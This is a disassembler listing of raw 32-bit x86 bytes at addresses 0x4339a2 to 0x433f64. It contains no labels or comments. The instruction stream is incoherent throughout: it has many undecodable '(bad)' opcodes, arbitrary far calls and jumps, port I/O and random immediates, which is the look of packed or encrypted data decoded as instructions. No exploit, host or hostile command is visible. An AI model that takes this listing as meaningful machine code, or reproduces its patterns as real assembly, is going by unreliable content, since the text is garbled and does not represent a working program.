  4339a2:	36 48                	ss dec %eax
  4339a4:	ed                   	in     (%dx),%eax
  4339a5:	1b 2f                	sbb    (%edi),%ebp
  4339a7:	f3 dc fb             	repz fdivr %st,%st(3)
  4339aa:	06                   	push   %es
  4339ab:	0c 60                	or     $0x60,%al
  4339ad:	83 a7 ed 5b 14 66 0f 	andl   $0xf,0x66145bed(%edi)
  4339b4:	80 ed ac             	sub    $0xac,%ch
  4339b7:	c2 42 37             	ret    $0x3742
  4339ba:	c6                   	(bad)
  4339bb:	de 58 93             	ficomps -0x6d(%eax)
  4339be:	c2 b2 47             	ret    $0x47b2
  4339c1:	9a d0 8c a9 a6 a6 2d 	lcall  $0x2da6,$0xa6a98cd0
  4339c8:	09 15 cc bf cb a5    	or     %edx,0xa5cbbfcc
  4339ce:	30 8d 9c 93 f4 c5    	xor    %cl,-0x3a0b6c64(%ebp)
  4339d4:	d5 0e                	aad    $0xe
  4339d6:	87 18                	xchg   %ebx,(%eax)
  4339d8:	64 d6                	fs salc
  4339da:	06                   	push   %es
  4339db:	c0 ed 6a             	shr    $0x6a,%ch
  4339de:	16                   	push   %ss
  4339df:	4a                   	dec    %edx
  4339e0:	2a c4                	sub    %ah,%al
  4339e2:	89 27                	mov    %esp,(%edi)
  4339e4:	71 c4                	jno    0x4339aa
  4339e6:	21 bc 13 89 b3 bb 0b 	and    %edi,0xbbbb389(%ebx,%edx,1)
  4339ed:	f6 0e ee             	testb  $0xee,(%esi)
  4339f0:	51                   	push   %ecx
  4339f1:	11 01                	adc    %eax,(%ecx)
  4339f3:	c9                   	leave
  4339f4:	76 7a                	jbe    0x433a70
  4339f6:	73 2b                	jae    0x433a23
  4339f8:	a9 da ba e5 65       	test   $0x65e5bada,%eax
  4339fd:	f0 b2 19             	lock mov $0x19,%dl
  433a00:	c9                   	leave
  433a01:	bb 00 d0 ea a4       	mov    $0xa4ead000,%ebx
  433a06:	8c 32                	mov    %?,(%edx)
  433a08:	cf                   	iret
  433a09:	c0 26 30             	shlb   $0x30,(%esi)
  433a0c:	31 06                	xor    %eax,(%esi)
  433a0e:	22 5e 01             	and    0x1(%esi),%bl
  433a11:	b2 81                	mov    $0x81,%dl
  433a13:	3c b1                	cmp    $0xb1,%al
  433a15:	c1 ab 7a e0 46 99 89 	shrl   $0x89,-0x66b91f86(%ebx)
  433a1c:	fe                   	(bad)
  433a1d:	9b                   	fwait
  433a1e:	83 21 f8             	andl   $0xfffffff8,(%ecx)
  433a21:	ad                   	lods   %ds:(%esi),%eax
  433a22:	8b 16                	mov    (%esi),%edx
  433a24:	5d                   	pop    %ebp
  433a25:	ce                   	into
  433a26:	f9                   	stc
  433a27:	0b 72 43             	or     0x43(%edx),%esi
  433a2a:	3c 96                	cmp    $0x96,%al
  433a2c:	18 1a                	sbb    %bl,(%edx)
  433a2e:	9f                   	lahf
  433a2f:	43                   	inc    %ebx
  433a30:	50                   	push   %eax
  433a31:	14 a9                	adc    $0xa9,%al
  433a33:	8a 71 f7             	mov    -0x9(%ecx),%dh
  433a36:	69 8d e4 a8 c6 96 aa 	imul   $0x548d1caa,-0x6939571c(%ebp),%ecx
  433a3d:	1c 8d 54 
  433a40:	9f                   	lahf
  433a41:	6c                   	insb   (%dx),%es:(%edi)
  433a42:	61                   	popa
  433a43:	b4 6f                	mov    $0x6f,%ah
  433a45:	7b e2                	jnp    0x433a29
  433a47:	11 f4                	adc    %esi,%esp
  433a49:	5c                   	pop    %esp
  433a4a:	26 c6                	es (bad)
  433a4c:	1a 2e                	sbb    (%esi),%ch
  433a4e:	e0 c8                	loopne 0x433a18
  433a50:	70 e5                	jo     0x433a37
  433a52:	f0 9b d9 9e e1 88 2f 	lock fstps -0x2cd0771f(%esi)
  433a59:	d3 
  433a5a:	0a f9                	or     %cl,%bh
  433a5c:	19 63 b4             	sbb    %esp,-0x4c(%ebx)
  433a5f:	b0 d6                	mov    $0xd6,%al
  433a61:	11 b2 21 c0 e8 fd    	adc    %esi,-0x2173fdf(%edx)
  433a67:	7d 4f                	jge    0x433ab8
  433a69:	17                   	pop    %ss
  433a6a:	9c                   	pushf
  433a6b:	49                   	dec    %ecx
  433a6c:	3a 9d e6 af dc 7a    	cmp    0x7adcafe6(%ebp),%bl
  433a72:	e3 03                	jecxz  0x433a77
  433a74:	52                   	push   %edx
  433a75:	ae                   	scas   %es:(%edi),%al
  433a76:	47                   	inc    %edi
  433a77:	71 c2                	jno    0x433a3b
  433a79:	cc                   	int3
  433a7a:	cb                   	lret
  433a7b:	96                   	xchg   %eax,%esi
  433a7c:	7a 61                	jp     0x433adf
  433a7e:	39 aa 63 31 32 be    	cmp    %ebp,-0x41cdce9d(%edx)
  433a84:	01 19                	add    %ebx,(%ecx)
  433a86:	0d 0b 8f ef f9       	or     $0xf9ef8f0b,%eax
  433a8b:	62 5a e7             	bound  %ebx,-0x19(%edx)
  433a8e:	da 00                	fiaddl (%eax)
  433a90:	ce                   	into
  433a91:	0a c3                	or     %bl,%al
  433a93:	ea f9 af a1 8e 7d 6b 	ljmp   $0x6b7d,$0x8ea1aff9
  433a9a:	82 fc 1c             	cmp    $0x1c,%ah
  433a9d:	bc 61 8e b2 26       	mov    $0x26b28e61,%esp
  433aa2:	28 50 a9             	sub    %dl,-0x57(%eax)
  433aa5:	a8 2b                	test   $0x2b,%al
  433aa7:	8e 46 ce             	mov    -0x32(%esi),%es
  433aaa:	7a 86                	jp     0x433a32
  433aac:	b5 67                	mov    $0x67,%ch
  433aae:	92                   	xchg   %eax,%edx
  433aaf:	25 3e 8d e6 20       	and    $0x20e68d3e,%eax
  433ab4:	ef                   	out    %eax,(%dx)
  433ab5:	26 2c 81             	es sub $0x81,%al
  433ab8:	c8 7b e3 a7          	enter  $0xe37b,$0xa7
  433abc:	e7 88                	out    %eax,$0x88
  433abe:	2a 35 bd 32 cc 8a    	sub    0x8acc32bd,%dh
  433ac4:	c9                   	leave
  433ac5:	89 e8                	mov    %ebp,%eax
  433ac7:	64 50                	fs push %eax
  433ac9:	56                   	push   %esi
  433aca:	9e                   	sahf
  433acb:	ce                   	into
  433acc:	70 2d                	jo     0x433afb
  433ace:	55                   	push   %ebp
  433acf:	92                   	xchg   %eax,%edx
  433ad0:	9f                   	lahf
  433ad1:	5e                   	pop    %esi
  433ad2:	14 9a                	adc    $0x9a,%al
  433ad4:	49                   	dec    %ecx
  433ad5:	ad                   	lods   %ds:(%esi),%eax
  433ad6:	aa                   	stos   %al,%es:(%edi)
  433ad7:	c7                   	(bad)
  433ad8:	d3 1c a2             	rcrl   %cl,(%edx,%eiz,4)
  433adb:	f9                   	stc
  433adc:	a8 bc                	test   $0xbc,%al
  433ade:	84 4a c7             	test   %cl,-0x39(%edx)
  433ae1:	fe                   	(bad)
  433ae2:	ec                   	in     (%dx),%al
  433ae3:	e4 9d                	in     $0x9d,%al
  433ae5:	34 40                	xor    $0x40,%al
  433ae7:	ae                   	scas   %es:(%edi),%al
  433ae8:	7c 1a                	jl     0x433b04
  433aea:	32 be ff ad 6c 13    	xor    0x136cadff(%esi),%bh
  433af0:	39 03                	cmp    %eax,(%ebx)
  433af2:	c5 aa 06 f0 a3 54    	lds    0x54a3f006(%edx),%ebp
  433af8:	7e 2c                	jle    0x433b26
  433afa:	08 8c 59 ea 44 04 15 	or     %cl,0x150444ea(%ecx,%ebx,2)
  433b01:	b4 5f                	mov    $0x5f,%ah
  433b03:	2e 9b                	cs fwait
  433b05:	03 9e f0 91 3e 42    	add    0x423e91f0(%esi),%ebx
  433b0b:	26 aa                	es stos %al,%es:(%edi)
  433b0d:	c4 1a                	les    (%edx),%ebx
  433b0f:	17                   	pop    %ss
  433b10:	c8 80 d3 d6          	enter  $0xd380,$0xd6
  433b14:	52                   	push   %edx
  433b15:	2d e2 e3 61 d8       	sub    $0xd861e3e2,%eax
  433b1a:	8d 74 a1 3e          	lea    0x3e(%ecx,%eiz,4),%esi
  433b1e:	1d 1c 26 00 c0       	sbb    $0xc000261c,%eax
  433b23:	bf aa 55 05 1b       	mov    $0x1b0555aa,%edi
  433b28:	23 b6 2d 94 58 8a    	and    -0x75a76bd3(%esi),%esi
  433b2e:	17                   	pop    %ss
  433b2f:	4a                   	dec    %edx
  433b30:	fd                   	std
  433b31:	dd d6                	fst    %st(6)
  433b33:	5b                   	pop    %ebx
  433b34:	cb                   	lret
  433b35:	e8 e8 ac 0a 39       	call   0x394de822
  433b3a:	de 73 c7             	fidivs -0x39(%ebx)
  433b3d:	16                   	push   %ss
  433b3e:	3b b8 aa d1 eb 39    	cmp    0x39ebd1aa(%eax),%edi
  433b44:	22 f5                	and    %ch,%dh
  433b46:	88 bc c6 34 e5 80 2d 	mov    %bh,0x2d80e534(%esi,%eax,8)
  433b4d:	e8 5b 2a a6 b0       	call   0xb0e965ad
  433b52:	ad                   	lods   %ds:(%esi),%eax
  433b53:	35 dd 35 e1 f6       	xor    $0xf6e135dd,%eax
  433b58:	69 06 cf 81 fa 19    	imul   $0x19fa81cf,(%esi),%eax
  433b5e:	55                   	push   %ebp
  433b5f:	d7                   	xlat   %ds:(%ebx)
  433b60:	e7 99                	out    %eax,$0x99
  433b62:	40                   	inc    %eax
  433b63:	88 fe                	mov    %bh,%dh
  433b65:	34 24                	xor    $0x24,%al
  433b67:	51                   	push   %ecx
  433b68:	fe                   	(bad)
  433b69:	3c 27                	cmp    $0x27,%al
  433b6b:	10 a8 af 2d 57 31    	adc    %ch,0x31572daf(%eax)
  433b71:	7a d8                	jp     0x433b4b
  433b73:	7f 28                	jg     0x433b9d
  433b75:	e4 92                	in     $0x92,%al
  433b77:	28 37                	sub    %dh,(%edi)
  433b79:	10 5b 16             	adc    %bl,0x16(%ebx)
  433b7c:	54                   	push   %esp
  433b7d:	9f                   	lahf
  433b7e:	87 67 51             	xchg   %esp,0x51(%edi)
  433b81:	7e 43                	jle    0x433bc6
  433b83:	4a                   	dec    %edx
  433b84:	5f                   	pop    %edi
  433b85:	ca 2c 43             	lret   $0x432c
  433b88:	20 a8 f2 72 49 fc    	and    %ch,-0x3b68d0e(%eax)
  433b8e:	55                   	push   %ebp
  433b8f:	54                   	push   %esp
  433b90:	2a e1                	sub    %cl,%ah
  433b92:	ec                   	in     (%dx),%al
  433b93:	1e                   	push   %ds
  433b94:	94                   	xchg   %eax,%esp
  433b95:	4d                   	dec    %ebp
  433b96:	38 91 2f 1c d0 79    	cmp    %dl,0x79d01c2f(%ecx)
  433b9c:	9b                   	fwait
  433b9d:	21 5d 2d             	and    %ebx,0x2d(%ebp)
  433ba0:	81 02 60 1b 4a 45    	addl   $0x454a1b60,(%edx)
  433ba6:	72 0c                	jb     0x433bb4
  433ba8:	c0 68 7f 54          	shrb   $0x54,0x7f(%eax)
  433bac:	26 85 e5             	es test %esp,%ebp
  433baf:	b1 af                	mov    $0xaf,%cl
  433bb1:	84 a4 c2 ca ab 6c e7 	test   %ah,-0x18935436(%edx,%eax,8)
  433bb8:	51                   	push   %ecx
  433bb9:	61                   	popa
  433bba:	81 68 e1 d7 13 9b 69 	subl   $0x699b13d7,-0x1f(%eax)
  433bc1:	2b 7f 51             	sub    0x51(%edi),%edi
  433bc4:	61                   	popa
  433bc5:	02 e6                	add    %dh,%ah
  433bc7:	5c                   	pop    %esp
  433bc8:	1d 9f 05 6b b8       	sbb    $0xb86b059f,%eax
  433bcd:	c5 81 c6 9b 72 55    	lds    0x55729bc6(%ecx),%eax
  433bd3:	c2 dc 60             	ret    $0x60dc
  433bd6:	bd 55 04 eb da       	mov    $0xdaeb0455,%ebp
  433bdb:	83 36 a7             	xorl   $0xffffffa7,(%esi)
  433bde:	6c                   	insb   (%dx),%es:(%edi)
  433bdf:	39 c3                	cmp    %eax,%ebx
  433be1:	b8 22 d4 71 54       	mov    $0x5471d422,%eax
  433be6:	21 d6                	and    %edx,%esi
  433be8:	e2 f0                	loop   0x433bda
  433bea:	c3                   	ret
  433beb:	f2 ad                	repnz lods %ds:(%esi),%eax
  433bed:	9a 1e b6 03 82 f0 9e 	lcall  $0x9ef0,$0x8203b61e
  433bf4:	41                   	inc    %ecx
  433bf5:	81 16 7f 6d 4d 15    	adcl   $0x154d6d7f,(%esi)
  433bfb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433bfc:	d2 0a                	rorb   %cl,(%edx)
  433bfe:	41                   	inc    %ecx
  433bff:	89 a9 5d 28 34 64    	mov    %ebp,0x6434285d(%ecx)
  433c05:	22 ce                	and    %dh,%cl
  433c07:	d7                   	xlat   %ds:(%ebx)
  433c08:	4f                   	dec    %edi
  433c09:	03 fe                	add    %esi,%edi
  433c0b:	e6 07                	out    %al,$0x7
  433c0d:	81 cc af 30 94 fe    	or     $0xfe9430af,%esp
  433c13:	36 6e                	outsb  %ss:(%esi),(%dx)
  433c15:	6a b7                	push   $0xffffffb7
  433c17:	01 7f 95             	add    %edi,-0x6b(%edi)
  433c1a:	34 b3                	xor    $0xb3,%al
  433c1c:	e3 36                	jecxz  0x433c54
  433c1e:	49                   	dec    %ecx
  433c1f:	5c                   	pop    %esp
  433c20:	67 0e                	addr16 push %cs
  433c22:	ea 80 01 a5 42 50 08 	ljmp   $0x850,$0x42a50180
  433c29:	a1 0b b6 e2 e4       	mov    0xe4e2b60b,%eax
  433c2e:	0d 71 97 2f b8       	or     $0xb82f9771,%eax
  433c33:	3d 3a 34 41 0d       	cmp    $0xd41343a,%eax
  433c38:	93                   	xchg   %eax,%ebx
  433c39:	d2 93 27 e1 94 7d    	rclb   %cl,0x7d94e127(%ebx)
  433c3f:	41                   	inc    %ecx
  433c40:	77 32                	ja     0x433c74
  433c42:	b6 a5                	mov    $0xa5,%dh
  433c44:	e8 87 91 4a 9f       	call   0x9f8dcdd0
  433c49:	a8 40                	test   $0x40,%al
  433c4b:	00 1c 88             	add    %bl,(%eax,%ecx,4)
  433c4e:	e6 50                	out    %al,$0x50
  433c50:	cb                   	lret
  433c51:	9b                   	fwait
  433c52:	fb                   	sti
  433c53:	e7 0b                	out    %eax,$0xb
  433c55:	2f                   	das
  433c56:	ec                   	in     (%dx),%al
  433c57:	66 32 26             	data16 xor (%esi),%ah
  433c5a:	af                   	scas   %es:(%edi),%eax
  433c5b:	c7                   	(bad)
  433c5c:	20 c3                	and    %al,%bl
  433c5e:	ff af c9 8c d1 03    	ljmp   *0x3d18cc9(%edi)
  433c64:	89 89 96 73 43 d6    	mov    %ecx,-0x29bc8c6a(%ecx)
  433c6a:	c0 15 38 de 43 da 13 	rclb   $0x13,0xda43de38
  433c71:	24 62                	and    $0x62,%al
  433c73:	e9 58 83 b8 ad       	jmp    0xadfbbfd0
  433c78:	5e                   	pop    %esi
  433c79:	90                   	nop
  433c7a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  433c7b:	12 9a 95 a1 a0 93    	adc    -0x6c5f5e6b(%edx),%bl
  433c81:	59                   	pop    %ecx
  433c82:	12 01                	adc    (%ecx),%al
  433c84:	c5 90 9d f4 bd ee    	lds    -0x11420b63(%eax),%edx
  433c8a:	09 14 0e             	or     %edx,(%esi,%ecx,1)
  433c8d:	90                   	nop
  433c8e:	c6                   	(bad)
  433c8f:	31 c9                	xor    %ecx,%ecx
  433c91:	f2 94                	repnz xchg %eax,%esp
  433c93:	e1 90                	loope  0x433c25
  433c95:	43                   	inc    %ebx
  433c96:	6b 35 c6 15 d2 c6 0c 	imul   $0xc,0xc6d215c6,%esi
  433c9d:	76 a7                	jbe    0x433c46
  433c9f:	1b ad b0 70 7b 0e    	sbb    0xe7b70b0(%ebp),%ebp
  433ca5:	34 93                	xor    $0x93,%al
  433ca7:	60                   	pusha
  433ca8:	e9 6c f5 2a 83       	jmp    0x836e3219
  433cad:	b4 56                	mov    $0x56,%ah
  433caf:	4c                   	dec    %esp
  433cb0:	77 c2                	ja     0x433c74
  433cb2:	66 93                	xchg   %ax,%bx
  433cb4:	9a d8 3a 52 01 23 25 	lcall  $0x2523,$0x1523ad8
  433cbb:	f7 37                	divl   (%edi)
  433cbd:	93                   	xchg   %eax,%ebx
  433cbe:	9b                   	fwait
  433cbf:	5e                   	pop    %esi
  433cc0:	de a0 56 9e 6f a4    	fisubs -0x5b9061aa(%eax)
  433cc6:	9a 2f 82 41 be 69 93 	lcall  $0x9369,$0xbe41822f
  433ccd:	01 2f                	add    %ebp,(%edi)
  433ccf:	85 0b                	test   %ecx,(%ebx)
  433cd1:	4c                   	dec    %esp
  433cd2:	2e ee                	cs out %al,(%dx)
  433cd4:	db 5b 6e             	fistpl 0x6e(%ebx)
  433cd7:	9e                   	sahf
  433cd8:	4d                   	dec    %ebp
  433cd9:	ed                   	in     (%dx),%eax
  433cda:	7b 2a                	jnp    0x433d06
  433cdc:	67 2b a1 19 93       	sub    -0x6ce7(%bx,%di),%esp
  433ce1:	75 96                	jne    0x433c79
  433ce3:	9c                   	pushf
  433ce4:	eb 7f                	jmp    0x433d65
  433ce6:	e1 69                	loope  0x433d51
  433ce8:	c2 37 79             	ret    $0x7937
  433ceb:	f4                   	hlt
  433cec:	d9 ef                	(bad)
  433cee:	15 a4 b2 05 a7       	adc    $0xa705b2a4,%eax
  433cf3:	46                   	inc    %esi
  433cf4:	fb                   	sti
  433cf5:	be d4 a1 c2 b8       	mov    $0xb8c2a1d4,%esi
  433cfa:	dd 87 98 b2 66 f4    	fldl   -0xb994d68(%edi)
  433d00:	57                   	push   %edi
  433d01:	8d 39                	lea    (%ecx),%edi
  433d03:	65 16                	gs push %ss
  433d05:	39 6f b3             	cmp    %ebp,-0x4d(%edi)
  433d08:	17                   	pop    %ss
  433d09:	45                   	inc    %ebp
  433d0a:	cc                   	int3
  433d0b:	cb                   	lret
  433d0c:	27                   	daa
  433d0d:	f9                   	stc
  433d0e:	37                   	aaa
  433d0f:	39 88 7e 66 43 4f    	cmp    %ecx,0x4f43667e(%eax)
  433d15:	1d 58 15 b4 e1       	sbb    $0xe1b41558,%eax
  433d1a:	8f                   	(bad)
  433d1b:	b1 63                	mov    $0x63,%cl
  433d1d:	dc 1a                	fcompl (%edx)
  433d1f:	54                   	push   %esp
  433d20:	7d f5                	jge    0x433d17
  433d22:	fc                   	cld
  433d23:	43                   	inc    %ebx
  433d24:	86 1c 02             	xchg   %bl,(%edx,%eax,1)
  433d27:	22 25 50 a3 14 15    	and    0x1514a350,%ah
  433d2d:	a3 78 53 50 15       	mov    %eax,0x15505378
  433d32:	68 f8 34 0b f4       	push   $0xf40b34f8
  433d37:	5a                   	pop    %edx
  433d38:	7b 7a                	jnp    0x433db4
  433d3a:	5d                   	pop    %ebp
  433d3b:	6c                   	insb   (%dx),%es:(%edi)
  433d3c:	88 ec                	mov    %ch,%ah
  433d3e:	d1 60 87             	shll   $1,-0x79(%eax)
  433d41:	2e 4c                	cs dec %esp
  433d43:	3c 5c                	cmp    $0x5c,%al
  433d45:	6a b7                	push   $0xffffffb7
  433d47:	a2 1f b6 a8 e3       	mov    %al,0xe3a8b61f
  433d4c:	35 73 75 f5 ff       	xor    $0xfff57573,%eax
  433d51:	9d                   	popf
  433d52:	4a                   	dec    %edx
  433d53:	7b db                	jnp    0x433d30
  433d55:	70 11                	jo     0x433d68
  433d57:	03 37                	add    (%edi),%esi
  433d59:	5e                   	pop    %esi
  433d5a:	c2 63 40             	ret    $0x4063
  433d5d:	db 5c a1 65          	fistpl 0x65(%ecx,%eiz,4)
  433d61:	3e e5 54             	ds in  $0x54,%eax
  433d64:	21 75 93             	and    %esi,-0x6d(%ebp)
  433d67:	3d 30 8d 80 3f       	cmp    $0x3f808d30,%eax
  433d6c:	18 49 0e             	sbb    %cl,0xe(%ecx)
  433d6f:	e6 ce                	out    %al,$0xce
  433d71:	d3 1f                	rcrl   %cl,(%edi)
  433d73:	ad                   	lods   %ds:(%esi),%eax
  433d74:	5d                   	pop    %ebp
  433d75:	f0 7c f3             	lock jl 0x433d6b
  433d78:	31 37                	xor    %esi,(%edi)
  433d7a:	98                   	cwtl
  433d7b:	6b a5 17 a3 57 91 b2 	imul   $0xffffffb2,-0x6ea85ce9(%ebp),%esp
  433d82:	d5 34                	aad    $0x34
  433d84:	9b                   	fwait
  433d85:	0b ca                	or     %edx,%ecx
  433d87:	6d                   	insl   (%dx),%es:(%edi)
  433d88:	83 05 ce e4 e8 2b b2 	addl   $0xffffffb2,0x2be8e4ce
  433d8f:	94                   	xchg   %eax,%esp
  433d90:	3c a4                	cmp    $0xa4,%al
  433d92:	bd 57 cb 8e da       	mov    $0xda8ecb57,%ebp
  433d97:	6e                   	outsb  %ds:(%esi),(%dx)
  433d98:	82 d8 8c             	sbb    $0x8c,%al
  433d9b:	38 28                	cmp    %ch,(%eax)
  433d9d:	ec                   	in     (%dx),%al
  433d9e:	79 27                	jns    0x433dc7
  433da0:	69 ba cd 09 8e 92 ff 	imul   $0x190b94ff,-0x6d71f633(%edx),%edi
  433da7:	94 0b 19 
  433daa:	da b0 77 ff 5a 03    	fidivl 0x35aff77(%eax)
  433db0:	e0 99                	loopne 0x433d4b
  433db2:	88 72 fb             	mov    %dh,-0x5(%edx)
  433db5:	ca 78 5e             	lret   $0x5e78
  433db8:	fb                   	sti
  433db9:	c4                   	(bad)
  433dba:	fc                   	cld
  433dbb:	4c                   	dec    %esp
  433dbc:	36 3f                	ss aas
  433dbe:	94                   	xchg   %eax,%esp
  433dbf:	4f                   	dec    %edi
  433dc0:	80 7f da cf          	cmpb   $0xcf,-0x26(%edi)
  433dc4:	d4 26                	aam    $0x26
  433dc6:	a0 da d0 ba 8e       	mov    0x8ebad0da,%al
  433dcb:	b9 71 fe b9 24       	mov    $0x24b9fe71,%ecx
  433dd0:	a9 02 74 8a 42       	test   $0x428a7402,%eax
  433dd5:	7f 86                	jg     0x433d5d
  433dd7:	41                   	inc    %ecx
  433dd8:	47                   	inc    %edi
  433dd9:	d6                   	salc
  433dda:	e9 79 c5 a1 2c       	jmp    0x2ce50358
  433ddf:	e1 5e                	loope  0x433e3f
  433de1:	53                   	push   %ebx
  433de2:	39 b9 67 9f 05 40    	cmp    %edi,0x40059f67(%ecx)
  433de8:	39 b0 a4 fa 1e 1d    	cmp    %esi,0x1d1efaa4(%eax)
  433dee:	74 03                	je     0x433df3
  433df0:	cb                   	lret
  433df1:	b1 41                	mov    $0x41,%cl
  433df3:	26 d3 9d af 24 31 05 	rcrl   %cl,%es:0x53124af(%ebp)
  433dfa:	9f                   	lahf
  433dfb:	6a e9                	push   $0xffffffe9
  433dfd:	05 8f b0 62 08       	add    $0x862b08f,%eax
  433e02:	fd                   	std
  433e03:	9a d2 d6 d0 02 a9 63 	lcall  $0x63a9,$0x2d0d6d2
  433e0a:	48                   	dec    %eax
  433e0b:	c6                   	(bad)
  433e0c:	15 d2 a3 03 47       	adc    $0x4703a3d2,%eax
  433e11:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  433e12:	90                   	nop
  433e13:	d9 ab 8a 8f 8d 03    	fldcw  0x38d8f8a(%ebx)
  433e19:	ef                   	out    %eax,(%dx)
  433e1a:	65 f0 80 9c 23 e5 a8 	lock sbbb $0x7,%gs:-0x765a571b(%ebx,%eiz,1)
  433e21:	a5 89 07 
  433e24:	cd ac                	int    $0xac
  433e26:	da ac b3 18 ab 66 39 	fisubrl 0x3966ab18(%ebx,%esi,4)
  433e2d:	2f                   	das
  433e2e:	61                   	popa
  433e2f:	95                   	xchg   %eax,%ebp
  433e30:	f9                   	stc
  433e31:	d4 76                	aam    $0x76
  433e33:	1e                   	push   %ds
  433e34:	e8 21 78 ab 50       	call   0x50eeb65a
  433e39:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433e3a:	7d 8e                	jge    0x433dca
  433e3c:	80 01 74             	addb   $0x74,(%ecx)
  433e3f:	58                   	pop    %eax
  433e40:	70 e0                	jo     0x433e22
  433e42:	27                   	daa
  433e43:	9b dd ee             	fucomp %st(6)
  433e46:	86 04 48             	xchg   %al,(%eax,%ecx,2)
  433e49:	bf 58 90 55 76       	mov    $0x76559058,%edi
  433e4e:	d4 01                	aam    $0x1
  433e50:	c0 f0 1c             	shl    $0x1c,%al
  433e53:	27                   	daa
  433e54:	a8 63                	test   $0x63,%al
  433e56:	66 71 9a             	data16 jno 0x433df3
  433e59:	2b dc                	sub    %esp,%ebx
  433e5b:	ab                   	stos   %eax,%es:(%edi)
  433e5c:	7e bd                	jle    0x433e1b
  433e5e:	e0 45                	loopne 0x433ea5
  433e60:	6a 60                	push   $0x60
  433e62:	37                   	aaa
  433e63:	93                   	xchg   %eax,%ebx
  433e64:	b9 49 45 4b cd       	mov    $0xcd4b4549,%ecx
  433e69:	bb 4c 06 2c 29       	mov    $0x292c064c,%ebx
  433e6e:	32 4a d0             	xor    -0x30(%edx),%cl
  433e71:	3b 68 dd             	cmp    -0x23(%eax),%ebp
  433e74:	82 19 61             	sbbb   $0x61,(%ecx)
  433e77:	aa                   	stos   %al,%es:(%edi)
  433e78:	7b 67                	jnp    0x433ee1
  433e7a:	62 ca c6             	(bad) {rd-bad},{bad}
  433e7d:	b8 21 e8 3c f1       	mov    $0xf13ce821,%eax
  433e82:	91                   	xchg   %eax,%ecx
  433e83:	e6 c0                	out    %al,$0xc0
  433e85:	fb                   	sti
  433e86:	58                   	pop    %eax
  433e87:	96                   	xchg   %eax,%esi
  433e88:	de 50 ba             	ficoms -0x46(%eax)
  433e8b:	de ed                	fsubrp %st,%st(5)
  433e8d:	59                   	pop    %ecx
  433e8e:	13 6e 64             	adc    0x64(%esi),%ebp
  433e91:	e3 17                	jecxz  0x433eaa
  433e93:	9b                   	fwait
  433e94:	70 c0                	jo     0x433e56
  433e96:	fc                   	cld
  433e97:	a3 81 ee eb 51       	mov    %eax,0x51ebee81
  433e9c:	70 12                	jo     0x433eb0
  433e9e:	e6 c9                	out    %al,$0xc9
  433ea0:	29 a9 75 f9 8a 63    	sub    %ebp,0x638af975(%ecx)
  433ea6:	65 31 f1             	gs xor %esi,%ecx
  433ea9:	bd 23 95 19 8f       	mov    $0x8f199523,%ebp
  433eae:	56                   	push   %esi
  433eaf:	4d                   	dec    %ebp
  433eb0:	13 be 90 15 b5 32    	adc    0x32b51590(%esi),%edi
  433eb6:	54                   	push   %esp
  433eb7:	80 09 c7             	orb    $0xc7,(%ecx)
  433eba:	36 90                	ss nop
  433ebc:	b0 ac                	mov    $0xac,%al
  433ebe:	04 9b                	add    $0x9b,%al
  433ec0:	dc 41 3f             	faddl  0x3f(%ecx)
  433ec3:	eb d7                	jmp    0x433e9c
  433ec5:	6d                   	insl   (%dx),%es:(%edi)
  433ec6:	e3 ff                	jecxz  0x433ec7
  433ec8:	e4 36                	in     $0x36,%al
  433eca:	54                   	push   %esp
  433ecb:	a3 70 dc 82 50       	mov    %eax,0x5082dc70
  433ed0:	9c                   	pushf
  433ed1:	27                   	daa
  433ed2:	d2 90 42 18 bd f2    	rclb   %cl,-0xd42e7be(%eax)
  433ed8:	e1 ae                	loope  0x433e88
  433eda:	b0 bb                	mov    $0xbb,%al
  433edc:	3c fb                	cmp    $0xfb,%al
  433ede:	d6                   	salc
  433edf:	18 f9                	sbb    %bh,%cl
  433ee1:	bd 22 15 18 36       	mov    $0x36181522,%ebp
  433ee6:	09 68 69             	or     %ebp,0x69(%eax)
  433ee9:	52                   	push   %edx
  433eea:	b0 62                	mov    $0x62,%al
  433eec:	8e dd                	mov    %ebp,%ds
  433eee:	5b                   	pop    %ebx
  433eef:	61                   	popa
  433ef0:	75 bf                	jne    0x433eb1
  433ef2:	d3 cd                	ror    %cl,%ebp
  433ef4:	ba 59 97 a8 95       	mov    $0x95a89759,%edx
  433ef9:	26 58                	es pop %eax
  433efb:	bd 6a 3b 22 8a       	mov    $0x8a223b6a,%ebp
  433f00:	6d                   	insl   (%dx),%es:(%edi)
  433f01:	2d 05 eb ba 89       	sub    $0x89baeb05,%eax
  433f06:	47                   	inc    %edi
  433f07:	bc 8d e3 81 82       	mov    $0x8281e38d,%esp
  433f0c:	11 bf 19 54 30 f1    	adc    %edi,-0xecfabe7(%edi)
  433f12:	24 6d                	and    $0x6d,%al
  433f14:	18 21                	sbb    %ah,(%ecx)
  433f16:	1d 82 dd 6b 7e       	sbb    $0x7e6bdd82,%eax
  433f1b:	ef                   	out    %eax,(%dx)
  433f1c:	ae                   	scas   %es:(%edi),%al
  433f1d:	16                   	push   %ss
  433f1e:	51                   	push   %ecx
  433f1f:	07                   	pop    %es
  433f20:	3c 84                	cmp    $0x84,%al
  433f22:	2d a5 1a c8 b0       	sub    $0xb0c81aa5,%eax
  433f27:	9a 04 ed 06 93 f1 1c 	lcall  $0x1cf1,$0x9306ed04
  433f2e:	ea df 5d 29 97 04 75 	ljmp   $0x7504,$0x97295ddf
  433f35:	13 d3                	adc    %ebx,%edx
  433f37:	fd                   	std
  433f38:	08 9d db 3a ff 4a    	or     %bl,0x4aff3adb(%ebp)
  433f3e:	60                   	pusha
  433f3f:	de 98 83 11 f0 67    	ficomps 0x67f01183(%eax)
  433f45:	33 38                	xor    (%eax),%edi
  433f47:	ac                   	lods   %ds:(%esi),%al
  433f48:	2f                   	das
  433f49:	64 9a 40 6e da 06 33 	fs lcall $0xfd33,$0x6da6e40
  433f50:	fd 
  433f51:	5d                   	pop    %ebp
  433f52:	bb 16 6f 53 5c       	mov    $0x5c536f16,%ebx
  433f57:	48                   	dec    %eax
  433f58:	e8 da d0 aa 20       	call   0x20ee1037
  433f5d:	47                   	inc    %edi
  433f5e:	91                   	xchg   %eax,%ecx
  433f5f:	97                   	xchg   %eax,%edi
  433f60:	ad                   	lods   %ds:(%esi),%eax
  433f61:	97                   	xchg   %eax,%edi
  433f62:	e3 ac                	jecxz  0x433f10
  433f64:	0b cf                	or     %edi,%ecx
